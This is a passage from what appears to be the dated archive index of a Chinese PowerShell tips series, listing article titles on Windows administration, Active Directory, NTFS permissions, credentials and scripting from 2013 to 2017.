通过前缀对文件夹分组 2013-12-09 创建一个文件夹选择器 2013-12-10 混淆凭据 2013-12-11 创建临时密码 2013-12-12 锁定屏幕 2013-12-13 为 AD 用户设置缺省的 Email 地址 2013-12-16 查找磁盘分区详细信息 2013-12-17 显示 Path 环境变量 2013-12-18 使用 PowerShell 管理 Office365 2013-12-19 将 Windows 8.1 中的 CMD.EXE 替换为 POWERSHELL.EXE 2013-12-20 获取本地组成员 2013-12-23 搜索本地用户 2013-12-24 在 Windows 8.1 中管理 Windows Defender 2013-12-25 搜索并观看 PowerShell 视频 2013-12-26 获取昨天午夜的日期值 2013-12-27 有序哈希表以及更改顺序 2013-12-30 从多个事件日志中获取错误事件 2013-12-31 获取最新的地震信息 2014 年2014 年 01 月 2014-01-01 PowerShell 远程管理和大尺寸令牌问题 2014-01-02 降低 PowerShell 进程优先级 2014-01-03 使用 ICACLS 提高文件夹安全性 2014-01-06 获取系统信息 2014-01-06 远程启动服务 2014-01-08 获取远程主机的系统信息 2014-01-09 在 ISE 编辑器中使用块注释 2014-01-10 更改桌面背景 2014-01-13 查询登录失败记录 2014-01-14 查询已登录的用户 2014-01-15 查找远程计算机上已登录的用户 2014-01-16 在 PowerShell ISE 中使用块注释 2014-01-17 在 ISE 编辑器中打开文件 2014-01-20 PowerShell 4.0 中隐藏的数组扩展方法 2014-01-21 删除空结果 2014-01-22 解锁下载的文件 2014-01-23 启动任何版本的 Excel 2014-01-24 快速创建新的本地管理员账户 2014-01-27 读写 NTFS 流 2014-01-28 根据主机名获取 DNS IP 地址 2014-01-29 当发生错误时播放一段声音 2014-01-30 Ping 主机 2014-01-31 单行内为多个变量赋值 2014 年 02 月 2014-02-03 朗读英文和德文（以及西班牙文，或您指定的语言） 2014-02-04 检测合法的时间 2014-02-05 用逗号作为十进制数分隔符 2014-02-06 带对话框的必选参数 2014-02-07 设置（及删除）环境变量 2014-02-10 读取注册表的可扩充字符串值 2014-02-11 从 PFX 文件中导入证书 2014-02-12 确保向后兼容 2014-02-13 在 Remoting 中使用完整限定名 2014-02-14 从 PFX 文件中导入多个证书 2014-02-17 在 PowerShell ISE 中创建干净的测试环境 2014-02-18 正确地按日期时间筛选 2014-02-19 用 PowerShell 为 VBScript 文件签名 2014-02-20 使用 $PSScriptRoot 加载资源 2014-02-21 持有一个进程的句柄 2014-02-24 过滤命令输出的文本 2014-02-25 使用别名来启动 Windows 组件 2014-02-26 展开字符串中的变量 2014-02-27 用 Select-Object -First 节省时间！ 2014-02-28 为对象增加信息 2014 年 03 月 2014-03-03 担心隐藏的输入密码请求 2014-03-04 消除重复 2014-03-05 轻松地格式化数字 2014-03-06 字符串左右对齐 2014-03-07 自动连接到公共热点 2014-03-09 查找一个时间点附近的日志 2014-03-11 导出数据到 Excel 2014-03-12 查找昨天以来的错误 2014-03-13 查找空闲容量低的硬盘驱动器 2014-03-14 以 GB 和百分比的形式显示驱动器容量 2014-03-17 查找无线网卡 2014-03-18 获取无线网卡 2014-03-19 在 PowerShell 中提升命令权限 2014-03-20 获取系统信息 2014-03-21 应用 NTFS 存取权限 2014-03-24 传递参数给 EXE 文件 2014-03-25 查找过期的证书 2014-03-26 获取时间服务器（以及读取所有注册表键值） 2014-03-27 查找 U 盘信息 2014-03-28 用 PowerShell 导入导出凭据 2014-03-31 启用传统远程控制 2014 年 04 月 2014-04-01 启用 PowerShell 远程管理 2014-04-02 验证 UNC 路径 2014-04-03 使用加密文件系统（EFS）来保护密码 2014-04-04 存储秘密数据 2014-04-07 读取整个文本文件 2014-04-08 修正 Excel CSV 的编码 2014-04-09 记录脚本的运行时间 2014-04-10 将 Tick 转换为真实的日期 2014-04-11 PowerShell 中的并行处理 2014-04-14 高效运行后台任务 2014-04-15 从所有事件日志中获取全部事件 2014-04-16 屏蔽终止性错误 2014-04-17 捕获非终止性错误 2014-04-18 记录所有错误 2014-04-21 将日志写入自定义的事件日志 2014-04-22 智能感知显示变量的技巧 2014-04-23 查找注册的事件源 2014-04-24 从 Google 图片搜索中获取图片 URL 2014-04-25 通过 Google 图片搜索自动下载图片 2014-04-28 弹出对话框时播放随机的音效 2014-04-29 从命令行中提取可执行程序名 2014-04-30 从命令行获取参数 2014 年 05 月 2014-05-01 查找缺省的 MAPI 客户端 2014-05-02 通过 Outlook 发送电子邮件 2014-05-05 显示 WPF 消息提示 2014-05-06 键盘鼠标自动化 2014-05-07 更新 Windows Defender 病毒定义 2014-05-08 获取父作用域中的变量值 2014-05-09 用 JSON 来创建对象 2014-05-12 PowerShell 不支持 JSON 数据类型 2014-05-13 创建 Excel 报表 2014-05-14 修正 Excel 报表中的显示 2014-05-15 批量重命名对象的属性 2014-05-16 ISE 的缺陷导致调试器阻塞 2014-05-19 将文本数组转换为字符串 2014-05-20 添加或重置 NTFS 权限 2014-05-21 编译二进制 Cmdlet 2014-05-22 开始学习 DSC 2014-05-23 获取免费的速查表 2014-05-26 检查 Windows 更新 2014-05-27 PowerShell 上帝模式 2014-05-28 移除选定的 NTFS 权限 2014-05-29 阻止非管理员权限运行脚本 2014-05-30 设置注册表权限 2014 年 06 月 2014-06-02 快速获取成员身份 2014-06-03 用 Splatting 技术提交参数 2014-06-04 用 Splatting 技术封装 WMI 调用 2014-06-05 获取数据库连接字符串 2014-06-06 远程执行 gpupdate 2014-06-09 远程读取已安装的软件 2014-06-10 从照片中读取拍摄日期 2014-06-11 批量重命名文件 2014-06-12 留意副作用 2014-06-13 使用配置脚本 2014-06-16 通过按键跳过配置脚本 2014-06-17 有趣的路径名 2014-06-18 不中断处理 Cmdlet 中的错误 2014-06-19 轻松读取注册表键值 2014-06-20 用事件日志代替日志文件 2014-06-23 加速数组操作 2014-06-24 使用嵌套的哈希表 2014-06-25 处理环境变量 2014-06-26 使用 break、continue 和 return 语句 2014-06-27 理解 exit 语句 2014-06-30 加速后台任务 2014 年 07 月 2014-07-01 为什么目录的大小为 1 2014-07-02 列出工作日 2014-07-03 通过 StringBuilder 加速脚本 2014-07-04 使用缺省参数 2014-07-07 查找两个日期之间的所有日子 2014-07-08 复制命令行历史记录 2014-07-09 复制命令行历史的工具函数 2014-07-10 简单地读取注册表值 2014-07-11 接受多重输入 2014-07-14 创建优越的报告 2014-07-15 从独立的文件中加载函数 2014-07-16 快速查找 AD 账户 2014-07-17 删除别名 2014-07-18 测试不带别名的脚本 2014-07-21 转换特殊字符（第一部分） 2014-07-22 转换特殊字符（第二部分） 2014-07-23 别名有可能带来风险 2014-07-24 以底层的方式管理打印机 2014-07-25 指定递归深度 2014-07-28 使系统休眠 2014-07-29 修正名单中的大小写 2014-07-30 修正 PowerShell 中的路径 2014-07-31 查找并提取注册表键的路径 2014 年 08 月 2014-08-01 查找 AD 用户 2014-08-04 请注意 UNC 路径！ 2014-08-05 编辑“hosts”文件 2014-08-06 产生多个返回值 2014-08-07 有趣的声音提示 2014-08-08 记录脚本做了什么事 2014-08-11 用 PowerShell 来励志 2014-08-12 用 Group-Object 来创建哈希表 2014-08-13 使用“打开文件”对话框 2014-08-14 修正 ISE 的编码 2014-08-15 获取指定扩展名的文件 2014-08-18 用正则表达式搜索文件 2014-08-19 复制命令行历史 2014-08-20 获取关机信息 2014-08-21 过滤 Hotfix 信息 2014-08-22 理解顺序过滤 2014-08-25 获取睡眠或休眠的时间 2014-08-26 获取 WMI 设备清单 2014-08-27 测试服务的响应性 2014-08-28 查找插入的 U 盘 2014-08-29 获取系统开机时长 2014 年 09 月 2014-09-01 播放 WAV 声音 2014-09-02 使用 -f 操作符合并字符串和数据 2014-09-03 计算倒计时小时数 2014-09-04 合并执行结果 2014-09-05 查找最大值和最小值 2014-09-08 快速处理路径 2014-09-09 重要的数学函数 2014-09-10 同时支持可选参数和必选参数 2014-09-11 忽略输出结果 2014-09-12 移除非法的路径字符 2014-09-15 获取字符串的行数 2014-09-16 检测文本中是否含有大写字母 2014-09-17 查找脚本中的错误 2014-09-18 等待按键 2014-09-19 下载 PowerShell 语言规范 2014-09-22 比较服务配置 2014-09-23 导出服务状态信息 2014-09-24 查找 PowerShell 函数 2014-09-25 创建短网址 2014-09-26 替换重复的空格 2014-09-29 分隔文本 2014-09-30 高级文本分隔 2014 年 10 月 2014-10-01 获取 MAC 地址 2014-10-02 通过 MAC 地址识别网卡厂家 2014-10-03 格式化行尾符 2014-10-06 重命名变量 2014-10-07 获取变量详细清单 2014-10-08 查找可改变的属性 2014-10-09 查找文件以及错误信息 2014-10-10 获取包含数据类型信息在内的注册表键值 2014-10-13 获取美国邮政编码 2014-10-14 列出所有信息 2014-10-15 WMI 搜索工具 2014-10-16 从文件中读取系统日志 2014-10-17 启用、禁用 PowerShell 远程操作 2014-10-20 在非域环境中使用 PowerShell 远程操作 2014-10-21 创建新对象 2014-10-22 伪造对象类型 2014-10-23 控制可执行文件的执行 2014-10-24 关闭“完整语言”模式 2014-10-27 创建彩色的 HTML 报告 2014-10-28 存取 SQLServer 数据库 2014-10-29 读取 PFX 证书 2014-10-30 改变 PowerShell 的优先级 2014-10-31 创建新的共享文件夹 2014 年 11 月 2014-11-03 调用记事本打印文本 2014-11-04 导入及安装证书 2014-11-05 显示 PowerShell 的命令行历史 2014-11-06 Invoke-Expression 是邪恶的 2014-11-07 用 Out-Host 代替 More 2014-11-10 用 EFS 加解密文件 2014-11-11 函数的优先级永远比 cmdlet 高 2014-11-12 在 PowerShell ISE 中使用 F1 键 2014-11-13 使用 IPv4 来 Ping 2014-11-24 用 Cmdlet 管理虚拟硬盘驱动器 2014-11-25 Join-Path 遇上不存在的驱动器会失败 2014-11-26 查看 Windows 版本 2014-11-27 读取磁盘和分区信息 2014-11-28 随机排列数字列表 2014 年 12 月 2014-12-01 数组中的空值 2014-12-02 配置 PowerShell 的步骤（第 1 部分） 2014-12-03 配置 PowerShell 的步骤（第 2 部分） 2014-12-04 PowerShell 技能连载 - 配置 PowerShell 的步骤（第 3 部分） 2014-12-05 PowerShell 技能连载 - 移除 AD 组成员 2014-12-08 根据 Excel 表批量创建 AD 用户 2014-12-09 设置 Active Directory 属性 2014-12-10 解析 DISM 日志文件 2014-12-11 查找进程所有者 2014-12-12 获取系统启动时间 2014-12-15 使用 WMI 继承 2014-12-16 捕获本地 EXE 的错误（第 1 部分） 2014-12-17 克隆 NTFS 权限 2014-12-18 用 SDDL 替换 NTFS 权限 2014-12-19 捕获本地 EXE 的错误（第 2 部分） 2014-12-22 设置 AD 或 Windows 的权限 2014-12-23 限制 String 的最大长度 2014-12-24 创建一大堆测试文件 2014-12-25 从 LDAP 路径获取 OU 2014-12-26 压缩路径 2014-12-29 处理 %ERRORLEVEL% 2014-12-30 检查 PowerShell 安全性 2014-12-31 改变 GPO 描述/备注 2015 年2015 年 01 月 2015-01-01 处理隐藏文件 2015-01-02 不通过 ProgID 操作 COM 对象 2015-01-05 查找非继承的权限 2015-01-06 创建 NTFS 安全报告 2015-01-07 检测 64 位操作系统 2015-01-08 条件断点 2015-01-09 解析 IP 地址（和参数类型） 2015-01-12 在输出中使用系统的错误颜色 2015-01-13 映射驱动器 2015-01-14 将代码转为大写 2015-01-15 简化 .NET 类型 2015-01-16 管理打印机 2015-01-19 远程更新组策略 2015-01-20 列出所有打印任务 2015-01-21 分析并移除打印任务 2015-01-22 要求管理员权限 2015-01-23 读取多行文本 2015-01-26 用 Cmdlet 来管理 MSI 安装包 2015-01-27 在线检测 DELL 保修 2015-01-28 获取计算机序列号 2015-01-29 复制命令行历史 2015-01-30 自动展开和内存消耗 2015 年 02 月 2015-02-02 凭据混淆器 2015-02-03 管理终端服务设置 2015-02-04 记录拒绝存取的文件夹 2015-02-05 使用打开文件夹对话框 2015-02-06 为必须的参数弹出一个对话框 2015-02-09 有用的静态 .NET 方法 2015-02-10 查找 AD 复制失败信息 2015-02-11 将 PowerShell 工具增加到 Windows 8 启动屏幕 2015-02-12 获得一个干净的 PowerShell 环境 2015-02-13 导出 Out-GridView 的内容 2015-02-16 查找所有可停止的服务 2015-02-17 Out-GridView：通用对话框 2015-02-18 将结果复制到剪贴板 2015-02-19 进程终结器（和一些陷阱） 2015-02-20 在 ISE 中使用代码区域 2015-02-23 使用 PowerShell ISE 调试器 2015-02-24 将文件的扩展名正常化 2015-02-25 获取 DELL 保修信息（第二部分） 2015-02-26 简化命令提示符 2015-02-27 使用数组作为参数的缺省值 2015 年 03 月 2015-03-02 使用基于 JSON 的 Web Service 2015-03-03 查找进程所有者 2015-03-04 PowerShell ISE 自动化 2015-03-05 播放 WAV 文件 2015-03-06 用 Finally 来处理关键的清理任务 2015-03-09 检测 Wi-Fi 适配器和电源 2015-03-10 随时获取 cmdlet 的帮助 2015-03-11 禁止确认信息 2015-03-12 展开对象数据结构 2015-03-13 检查网站的响应（和执行时间） 2015-03-16 用 PowerShell 打开网页 2015-03-17 根据类型对数据排序 2015-03-18 从注册表中读取文件扩展名关联（第一部分） 2015-03-19 从注册表中读取文件扩展名关联（第二部分） 2015-03-20 从注册表中读取用户配置文件 2015-03-23 在 PowerShell ISE 中使用“more” 2015-03-24 在脚本中包含资源 2015-03-25 使用常量 2015-03-26 只读及强类型变量 2015-03-27 查找只读型和常量型变量 2015-03-30 访问非 Microsoft LDAP 服务 2015-03-31 ISE 自动完成技巧 2015 年 04 月 2015-04-01 发现高影响级别 cmdlet 2015-04-02 智能参数验证 2015-04-03 查找 Exchange 邮箱 2015-04-06 用 Windows 加密信息 2015-04-07 用口令对文本信息加密 2015-04-08 查找所有活动的驱动器号 2015-04-09 对密码加密 2015-04-10 批量重命名文件 2015-04-13 比较文件夹内容 2015-04-14 查找电视剧信息 2015-04-15 读取注册表键值和值类型 2015-04-16 读取 RSS 频道 2015-04-17 使用 Splatting 技术 2015-04-20 安全使用 UNC 路径 2015-04-21 验证域凭据 2015-04-22 获取当前 IP 地址 2015-04-23 获取 IP 地址的地理信息 2015-04-24 检测危险的 NTFS 权限 2015-04-27 理解 break、continue、return 和 exit 语句 2015-04-28 为什么“exit”将会关掉 PowerShell 2015-04-29 从 PowerShell 脚本中接收错误返回值 2015-04-30 移除空白（和换行） 2015 年 05 月 2015-05-01 禁止更新后自动重启 2015-05-04 谁在使用网络资源？ 2015-05-05 将 CSV 转换为 Excel 文件 2015-05-06 面向管理员的免费 PowerShell 模块 2015-05-07 向管道传递一个数组 2015-05-08 跳出管道 2015-05-11 解析 PowerShell 脚本 2015-05-12 互斥参数 (1) 2015-05-13 互斥参数 (2) 2015-05-14 使用闭包将变量保持在脚本块内 2015-05-15 获取内存消耗值 2015-05-18 “Continue” 和标签 2015-05-19 跳出管道 2015-05-20 测试嵌套深度 2015-05-21 在控制台输出中使用符号 2015-05-22 在控制台输出中使用绿色的复选标记 2015-05-25 查找大写字符 2015-05-26 根据大写字符分割文本 2015-05-27 查找可执行程序 2015-05-28 在后台播放声音 2015-05-29 使用 PowerShell 的帮助窗口作为通用输出 2015 年 06 月 2015-06-01 显示函数参数 2015-06-02 分割超长代码行 2015-06-03 创建一个包含 NTFS 权限的文件夹 2015-06-04 管理 NTFS 权限 2015-06-05 获取非继承的 NTFS 权限 2015-06-08 移除非继承的 NTFS 权限 2015-06-09 管理 NTFS 权限继承 2015-06-10 创建动态脚本块 2015-06-11 安装 Windows 功能 2015-06-12 获取 CPU 核心和处理器信息 2015-06-15 如何查找包含指定参数的命令 2015-06-16 加载 PowerShell 模块 2015-06-17 从 PSSnapin 中加载 cmdlet 2015-06-18 刷新新挂载的磁盘 2015-06-19 查找最重要的错误系统日志 2015-06-22 分析（所有）事件日志源 2015-06-23 快捷循环 2015-06-24 列出所有脚本中的所有变量 2015-06-25 将“列出所有变量”功能加入 PowerShell 2015-06-26 获取 Active Directory 用户名 2015-06-29 打开网页 2015-06-30 创建“结束进程”应用 2015 年 07 月 2015-07-01 创建友好的“结束进程”应用程序 2015-07-02 将过期的日志存档 2015-07-03 加密文本 2015-07-06 设置本地 Administrator 账号的密码 2015-07-07 AD 操作自动化入门 2015-07-08 批量删除 AD 的防意外删除保护 2015-07-09 设置 AD 账号的过期时间 2015-07-10 使用 PowerShell 的帮助 2015-07-13 简单的 AD 组管理 2015-07-14 将命令历史保存到文件 2015-07-15 复制 Active Directory 安全设置 2015-07-16 向 AD 对象增加自定义属性 2015-07-17 更新 Active Directory 中的办公电话号码 2015-07-20 获取 SQL Server 连接字符串 2015-07-21 通过连接字符串访问 SQL 数据库 2015-07-22 查找物理登录的用户 2015-07-23 查找登录的用户 2015-07-24 测试一个网络端口 2015-07-27 查找打开了 PowerShell 远程操作功能的计算机 2015-07-28 解压 ZIP 文件 2015-07-29 在 PowerShell 3.0 和 4.0 中解压 ZIP 文件 2015-07-30 在任意 Powershell 版本中解压 ZIP 文件 2015-07-31 改变 ISE 缩放比例 2015 年 08 月 2015-08-03 查找带动态参数的 cmdlet 2015-08-04 发现动态参数 2015-08-05 当前脚本的路径 2015-08-06 定义多行文本 2015-08-07 解码 PowerShell 命令 2015-08-10 避免使用重定向符 2015-08-11 截短文本 2015-08-12 快速获取 IP 地址 2015-08-13 删除数组元素 2015-08-14 简单的 INI 文件替代 2015-08-17 向原始数据类型增加额外信息 2015-08-18 向对象增加额外信息 2015-08-19 隐藏变量内容 2015-08-20 快速查找脚本 2015-08-21 快速设置多个环境变量 2015-08-24 查找驱动器号 2015-08-25 以管理员身份执行指定的代码 2015-08-26 指定执行超时 2015-08-27 映射网络驱动器（第 1 部分） 2015-08-28 映射网络驱动器（第 2 部分） 2015-08-31 映射网络驱动器（第 3 部分） 2015 年 09 月 2015-09-02 只用一行代码创建新对象 2015-09-02 列出（并检查）PowerShell 用户配置 2015-09-03 逐行显示对象的属性 2015-09-04 通用属性和可选的通用属性 2015-09-07 输出的同时赋值 2015-09-08 定义缺省参数 2015-09-09 在 PowerShell ISE 中使用 PowerShell Tabs 2015-09-10 向 PowerShell ISE 添加测试宿主 2015-09-11 创建真实的类 2015-09-14 用 ProcessID 定位服务 2015-09-15 分析 svchost 进程 2015-09-16 访问网页内容 2015-09-17 为什么 Invoke-Expression 是邪恶的 2015-09-18 将哈希表用作条件化的代码库 2015-09-21 下载文件 2015-09-22 设置新的 Windows 注册所有者 2015-09-23 修正远程发送者信息 2015-09-24 移除 Windows 10 应用 2015-09-25 使用后台任务 2015-09-28 用 try..finally 在 PowerShell 关闭时执行代码 2015-09-29 使用编码的脚本 2015-09-30 复制数组（第 1 部分） 2015 年 10 月 2015-10-01 复制数组（第 2 部分） 2015-10-02 复制对象 2015-10-05 获取最后启动时间 2015-10-06 增加历史缓存 2015-10-07 复制命令历史 2015-10-08 为什么 $MaximumHistoryCount 容量有限 2015-10-09 为变量增加 ValidateRange 2015-10-12 快速创建编码的 PowerShell 命令 2015-10-13 删除别名 2015-10-14 为什么 GetTempFileName() 是有害的 2015-10-15 创建临时文件名 2015-10-16 简化参数属性 2015-10-19 查找 cmdlet 参数别名 2015-10-20 查找已加载的程序集 2015-10-21 自动修正 PowerShell 代码的大小写 2015-10-22 增加“命令未找到”处理器 2015-10-23 试试 CTRL+SPACE！ 2015-10-26 帮助 PowerShell 做得更好！ 2015-10-27 在命令提示符中显示路径 2015-10-28 为什么捕获不到某些错误 2015-10-29 查看操作系统版本 2015-10-30 和 Powershell 对话 2015 年 11 月 2015-11-05 将数字列表转换为有用的列表 2015-11-06 尽可能使用服务端过滤 2015-11-09 显示消息对话框 2015-11-10 从注册表中读取已安装的软件 2015-11-11 远程获取已安装的软件列表 2015-11-12 查找脚本块变量 2015-11-13 根据参数值执行不同的代码 2015-11-16 等待进程启动 2015-11-17 转换日期、时间格式 2015-11-18 以不同的格式输出文件大小 2015-11-19 使用网格窗口作为一个通用的对话框 2015-11-20 从 WMI 中搜索有用的信息 2015-11-23 将结果通过管道直接传给 Office Word 2015-11-24 为大量文件建立拷贝备份 2015-11-25 理解 -f 操作符 2015 年 12 月 2015-12-22 根据 OU 分析操作系统 2015-12-23 获取操作系统清单 2015-12-24 查询当前登录的用户名 2015-12-25 自动获取重要的支持响应信息 2015-12-28 强制用户修改密码 2015-12-29 清除回收站 2015-12-30 查找递归的 AD 成员 2015-12-31 管理 Windows 防火墙 2016 年2016 年 01 月 2016-01-01 用 Base64 编解码文本 2016-01-04 对图片编码 2016-01-05 用 WPF 窗口加载 Base64 编码的图片 2016-01-06 理解 PowerShell 的流 2016-01-07 使用 DCOM 协议运行 Get-CimInstance 2016-01-08 通过哈希表转换创建新的对象 2016-01-11 查找当前文件系统路径 2016 年 02 月 2016-02-02 处理数据（第 1 部分） 2016-02-03 处理数据（第 2 部分） 2016-02-04 处理数据（第 3 部分） 2016-02-05 将窗口置于前台 2016-02-08 统计一个 Word 文档中的页数 2016-02-09 换算货币 2016-02-10 神奇的下划线变量 2016-02-11 发送文本到记事本 2016-02-12 将对象发送到记事本 2016-02-15 谁在监听？（第一部分） 2016-02-16 谁在监听？（第二部分） 2016-02-17 得到一个借口 2016-02-18 不要混合不同的对象 2016-02-19 用 #requires 语句装饰脚本 2016-02-22 使用工作流来并发执行代码 2016-02-23 直接使用 .NET 类型 2016 年 08 月 2016-08-30 友好地使用 Robocopy 2016-08-31 替换类似 “Umlauts” 的特殊字符 2016 年 09 月 2016-09-01 通过管道输入数据 2016-09-02 替换 CSV 文件列名 2016-09-05 查找自启动项 2016-09-06 启用远程管理 2016-09-07 检查（本地和远程的）硬盘容量 2016-09-08 查看 ASCII 码 2016-09-09 Saving PowerShell User Defaults 2016-09-12 颜色之周: 设置 PowerShell ISE 控制台的颜色 2016-09-13 色彩之周: 为 PowerShell ISE 指定命名的颜色 2016-09-14 色彩之周: 设置 PowerShell ISE 的背景色 2016-09-15 色彩之周: 在 PowerShell ISE 控制台中使用透明度 2016-09-16 色彩之周: 改变错误信息颜色 2016-09-19 色彩之周: 改变 PowerShell ISE 中的错误信息颜色 2016-09-20 色彩之周: 为 PowerShell 控制台中的符号着色 2016-09-21 用秒表测定脚本执行时间 2016-09-22 显示对话框 2016-09-23 使用 UTC 时间 2016-09-26 Enum 之周: 枚举的自动转换 2016-09-27 Enum 之周: 列出枚举值 2016-09-28 Enum 之周: 理解枚举值 2016-09-29 Enum 之周: 快速关闭 Cmdlet 错误提示 2016-09-30 Enum 之周: PowerShell 5 中的枚举 2016 年 10 月 2016-10-03 查找由 DHCP 分配的 IP 地址 2016-10-04 查找 IP 地址的地理位置 2016-10-05 查找公开 IP 地址 2016-10-06 在地图上定位您的地理位置 2016-10-07 查找一个月中的第一天和最后一天 2016-10-10 在 Active Directory 中查找操作系统版本 2016-10-11 查找操作系统架构信息 2016-10-12 获取计算机的地理位置 2016-10-13 将 SID 翻译为用户名 2016-10-14 Getting List of Current Group Memberships 2016-10-17 查找隐藏的自启动程序 2016-10-18 理解二次远程连接问题 2016-10-19 用 CredSSP 解决二次远程连接 2016-10-20 在单侧启用 CredSSP 2016-10-21 PowerShell Remoting and HTTP 403 Error 2016-10-24 检查电子邮件地址（或其它文本）中的非法字符 2016-10-25 查找多个非法字符 2016-10-26 查找文件路径中的非法字符（基于文件系统） 2016-10-27 检查文件名的非法字符 2016-10-28 Cmelet 错误报告的简单策略 2016-10-31 从网站上下载图片 2016 年 11 月 2016-11-01 在 PowerShell ISE 中获得 Cmdlet 的 IntelliSense 2016-11-02 用一行代码更新 PowerShell 帮助信息 2016-11-03 获取 Cmdlet 参数的帮助 2016-11-04 （分别）测试文件和文件夹 2016-11-07 获取PowerShell Gallery 模块的最新版本 2016-11-08 利用命令行历史 2016-11-09 创建新对象的快速方法 2016-11-10 PSCustomObject 到底如何工作 2016-11-11 使用 Add-Member 时请注意！ 2016-11-14 本地帐户的内置支持 2016-11-15 systeminfo.exe 的最新替代 2016-11-16 在同一台机器上运行 32 位代码 2016-11-17 探索函数源码 2016-11-18 PowerShell 5.1 中的时区管理 2016-11-21 隐藏启动 PowerShell 2016-11-22 在 PowerShell 函数中使用命名的函数 2016-11-23 禁止按位置的参数 2016-11-24 修复 PowerShell 5 帮助的 Bug 2016-11-25 轻轻跳进 PowerShell 版本的丛林 2016-11-28 用其他身份启动程序 2016-11-29 高级错误处理：重新抛出异常 2016-11-30 捕获 Native EXE 的错误 2016 年 12 月 2016-12-01 使用自定义域 2016-12-02 使用自定义作用域来屏蔽任何输出 2016-12-05 创建文件共享 2016-12-06 同时使用 -Force 和 -WhatIf 时请注意 2016-12-07 安全地对文本加解密 2016-12-08 最常用的动词 2016-12-09 查找不合规的命令动词 2016-12-12 分析结果出现次数（不浪费内存） 2016-12-13 按属性值分割结果 2016-12-14 对启用 PIN 的用户使用 PowerShell Remoting 2016-12-15 等待进程退出 2016-12-16 创建 Time Span 2016-12-19 系统内存、单位和四舍五入 2016-12-20 检测文件或文件夹 2016-12-21 捕获 Linux 输出 2016-12-22 使用“Exit”和 Linux 通信 2016-12-23 在 PowerShell 中创建 WinForms GUI 界面 2016-12-26 复制着色过的代码 2016-12-27 扩展 Robocopy 2016-12-28 创建简单的 UI 2016-12-29 调整简单界面 2016-12-30 解析纯文本（第一部分） 2017 年2017 年 01 月 2017-01-02 解析纯文本（第二部分） 2017-01-03 解析纯文本（第三部分） 2017-01-04 管理凭据（第一部分） 2017-01-05 管理凭据（第二部分） 2017-01-06 管理凭据（第三部分） 2017-01-09 管理凭据（第四部分） 2017-01-10 管理凭据（第五部分） 2017-01-11 小心 Get-Credential 和 SecureString 2017-01-12 获取 AD 用户属性 2017-01-13 管理本地用户 2017-01-16 探索本地账户管理 cmdlet 2017-01-17 定位锁定的 AD 账户 2017-01-18 批量重命名照片 2017-01-19 明智地使用进度条 2017-01-20 隐藏进度条 2017-01-23 在资源管理器中打开 PowerShell 2017-01-24 检查整数的位数 2017-01-25 增加和删除反斜杠 2017-01-26 语音之周：使用语音讲述人 2017-01-27 语音之周：更改讲述人的语音 2017-01-30 语音之周：记录语音到文件合成器 2017-01-31 语音之周：使用语音合成器高级选项 2017 年 02 月 2017-02-01 加速 New-Object Synthesizer 2017-02-02 确定个人年龄 2017-02-03 使用命名空间 2017-02-06 使用类（创建对象 - 第一部分） 2017-02-07 使用类（初始化属性 - 第二部分） 2017-02-08 使用类（增加方法 - 第三部分） 2017-02-09 使用类（重载 - 第四部分） 2017-02-10 使用类（构造函数 - 第五部分） 2017-02-13 使用类（静态成员 - 第六部分） 2017-02-14 检查 Execution Policy 2017-02-15 检测有问题的 Execution Policy 设置 2017-02-16 免费的 PowerShell 起步指南 2017-02-20 接触 PowerShell 6.0 2017-02-21 检测宿主 2017-02-22 设置环境变量 2017-02-23 读取最新的环境变量 2017-02-24 用 Pester Tests 做测试 2017-02-27 显示或隐藏窗口 2017-02-28 Power Shell 5 的类继承（第一部分） 2017 年 03 月 2017-03-01 Power Shell 5 的类继承（第二部分） 2017-03-02 使用泛型 2017-03-03 管理比特标志位（第一部分） 2017-03-06 管理比特标志位（第二部分） 2017-03-07 管理比特标志位（第三部分） 2017-03-08 管理比特标志位（第四部分） 2017-03-09 探索对象 2017-03-10 危险的临时文件！ 2017-03-13 探索类型加速器 2017-03-14 快速创建对象数组 2017-03-15 Where-Object 和 .Where() 2017-03-16 查找所有含桌面的配置文件 2017-03-17 限制文本的长度（第一部分） 2017-03-20 限制文本的长度（第二部分） 2017-03-21 不带动词运行 Cmdlet 2017-03-22 调用一个脚本块 2017-03-23 按区域转换数据 2017-03-24 使用 PowerShell 参数验证器 2017-03-27 处理 LDAP 和日期 2017-03-28 使用通配符确定数组是否包含值 2017-03-29 管理 NTFS 权限 2017-03-30 到处 ActiveDirectory 模块 2017-03-31 检查证书详细信息 2017 年 04 月 2017-04-03 检查变量是否为 $NULL 2017-04-04 检查操作系统版本 2017-04-05 自动定义函数的别名 2017-04-06 检测字符代码 0 2017-04-07 处理长文件路径 2017-04-10 请注意别名 2017-04-11 直接导入证书（第一部分） 2017-04-12 直接导入证书（第二部分） 2017-04-13 将时钟周期转换为日期和时间（第一部分） 2017-04-14 将时钟周期转换为日期和时间（第二部分） 2017-04-17 用区域性固定的方式序列化日期和时间 2017-04-18 确认重复的 CSV 表头（第一部分） 2017-04-19 确认重复的 CSV 表头（第二部分） 2017-04-20 检测 CSV 的分隔符 2017-04-21 弹出 CD 驱动器 2017-04-24 评估 Exit Code（也叫做 Error Level – 第一部分） 2017-04-25 评估 Exit Code（也叫做 Error Level – 第二部分） 2017-04-26 评估 Exit Code（也叫做 Error Level – 第三部分） 2017-04-27 克隆文件夹结构（含 NTFS 权限） – 第一部分 2017-04-28 克隆文件夹结构（含 NTFS 权限） – 第二部分 2017 年 05 月 2017-05-01 将 AD 用户转为哈希表 2017-05-02 用 Out-GridView 启用 AD 用户 2017-05-03 翻译错误记录 2017-05-05 批量打印 Word 文档 2017-05-05 从德国媒体数据库下载视频 2017-05-08 HTML 编码 2017-05-09 HTML 高级编码 2017-05-10 .Replace() 和 -replace 的区别 2017-05-11 在远程系统中安装 MSI 2017-05-12 使用剪贴板来传输数据和结果 2017-05-15 将二进制字符串转为整形 2017-05-16 按位移位 2017-05-17 创建随机的 MAC 地址 2017-05-18 验证整形变量 2017-05-19 转义通配符 2017-05-22 请注意 ToString() 方法 2017-05-23 冒充 ToString() 方法 2017-05-24 生成随机密码 2017-05-25 搜索 AD 用户 2017-05-26 克隆 DHCP 服务器设置 2017-05-29 验证变量有效性 2017-05-30 测试 OU 2017-05-31 查找 OU 2017 年 06 月 2017-06-01 安全地删除数据 2017-06-02 映射网络驱动器 2017-06-05 强制刷新客户端时间 2017-06-06 Read-Host 阻塞自动化操作 2017-06-07 重要的 PowerShell 变量 2017-06-08 远程创建 SMB 共享 2017-06-09 More 命令的现代版替代品 2017-06-12 查看函数源码 2017-06-13 在计划任务中运行 PowerShell 脚本 2017-06-14 查找一个脚本块中的所有变量 2017-06-15 查找一个脚本中的所有变量 2017-06-16 